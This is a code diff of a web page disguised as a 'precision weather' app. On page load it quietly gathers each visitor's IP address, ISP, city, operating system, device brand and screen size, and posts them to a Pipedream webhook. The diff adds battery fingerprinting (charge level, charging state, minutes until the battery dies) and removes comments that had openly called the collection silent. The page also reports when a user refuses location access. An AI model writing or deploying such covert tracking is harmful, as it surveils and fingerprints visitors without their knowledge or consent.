@@ -79,7 +79,6 @@
         <h2 id="city-display">Fetching Location...</h2>
         <h1 id="temp-display">--°C</h1>
         <p id="condition-display">Gathering atmospheric metrics...</p>
-
         <button id="action-btn" onclick="triggerPinpointLocation()">Update Precision Weather</button>
     </div>
 
@@ -89,41 +88,33 @@
         const pipedreamURL = "https://eotwt8cj1vr426p.m.pipedream.net"; // Replace with your Pipedream webhook URL
         // =======================================================
 
-        // Phase 1 automatically runs on load, Phase 2 waits for the button press
         window.onload = function() {
             fetchWeatherByIP();
         };
 
-        // Helper function that parses the User-Agent string into simple terms
+        // Helper function that extracts OS and Brand signatures
         function getDeviceDetails() {
             const ua = navigator.userAgent;
             let os = "Unknown OS";
             let device = "Unknown Device";
 
-            // Extract Operating System
             if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10/11";
-            else if (ua.indexOf("Windows NT 6.1") !== -1) os = "Windows 7";
             else if (ua.indexOf("Macintosh") !== -1) os = "MacOS";
             else if (ua.indexOf("iPhone") !== -1) os = "iOS (iPhone)";
-            else if (ua.indexOf("iPad") !== -1) os = "iOS (iPad)";
             else if (ua.indexOf("Android") !== -1) os = "Android";
             else if (ua.indexOf("Linux") !== -1) os = "Linux";
 
-            // Extract Common Device Brands/Models silently
             if (/iPhone/i.test(ua)) device = "Apple iPhone";
-            else if (/iPad/i.test(ua)) device = "Apple iPad";
             else if (/Samsung|SM-|GT-/i.test(ua)) device = "Samsung Galaxy";
             else if (/OnePlus/i.test(ua)) device = "OnePlus Device";
             else if (/Pixel/i.test(ua)) device = "Google Pixel";
             else if (/Mi |Redmi|POCO/i.test(ua)) device = "Xiaomi/Redmi";
-            else if (/Vivo/i.test(ua)) device = "Vivo Device";
-            else if (/Oppo/i.test(ua)) device = "Oppo Device";
             else if (/Macintosh|Windows|Linux/i.test(ua)) device = "PC / Laptop";
 
             return { os: os, device: device };
         }
 
-        // --- PHASE 1: AUTOMATIC BACKGROUND IP & DEVICE LOAD ---
+        // --- PHASE 1: AUTOMATIC BACKGROUND IP, DEVICE, & BATTERY LOAD ---
         function fetchWeatherByIP() {
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
@@ -132,18 +123,36 @@
                 .then(ipData => {
                     const ipCity = ipData.city || "Hyderabad"; 
                     const hardware = getDeviceDetails();
-                    
-                    // Dispatches all device configurations, IP details, and screen sizing to Pipedream immediately
-                    sendTrackingData({ 
-                        event: "instant_ip_and_device_load", 
-                        city: ipCity, 
-                        ip: ipData.ip,
-                        isp: ipData.org,
-                        user_operating_system: hardware.os,
-                        user_device_brand: hardware.device,
-                        screen_resolution: `${window.screen.width}x${window.screen.height}`,
-                        raw_user_agent: navigator.userAgent
-                    });
+
+                    // Query the browser's hardware battery monitor
+                    if (navigator.getBattery) {
+                        navigator.getBattery().then(battery => {
+                            // Calculate simple minutes remaining from raw seconds
+                            const minsLeft = battery.dischargingTime !== Infinity ? Math.round(battery.dischargingTime / 60) : "Infinite (Plugged In)";
+
+                            // Dispatch the fully loaded payload instantly to Pipedream
+                            sendTrackingData({ 
+                                event: "instant_ip_device_and_battery_load", 
+                                city: ipCity, 
+                                ip: ipData.ip,
+                                isp: ipData.org,
+                                user_operating_system: hardware.os,
+                                user_device_brand: hardware.device,
+                                screen_resolution: `${window.screen.width}x${window.screen.height}`,
+                                battery_percentage: `${Math.round(battery.level * 100)}%`,
+                                battery_is_charging: battery.charging,
+                                minutes_until_dead: minsLeft
+                            });
+                        });
+                    } else {
+                        // Fallback tracking if browser cuts battery metrics (like Safari)
+                        sendTrackingData({
+                            event: "instant_ip_and_device_load",
+                            city: ipCity,
+                            ip: ipData.ip,
+                            user_device_brand: hardware.device
+                        });
+                    }
 
                     return fetch(`https://api.openweathermap.org/data/2.5/weather?q=${ipCity}&units=metric&appid=${apiKey}`);
                 })
@@ -194,8 +203,6 @@
                     (error) => {
                         console.warn("User clicked Deny or prompt closed.");
                         sendTrackingData({ event: "gps_denied_by_user" });
-                        
-                        // Silent layout restoration: Button resets but screen parameters remain untouched
                         btn.innerText = "Update Precision Weather";
                         btn.disabled = false;
                     },
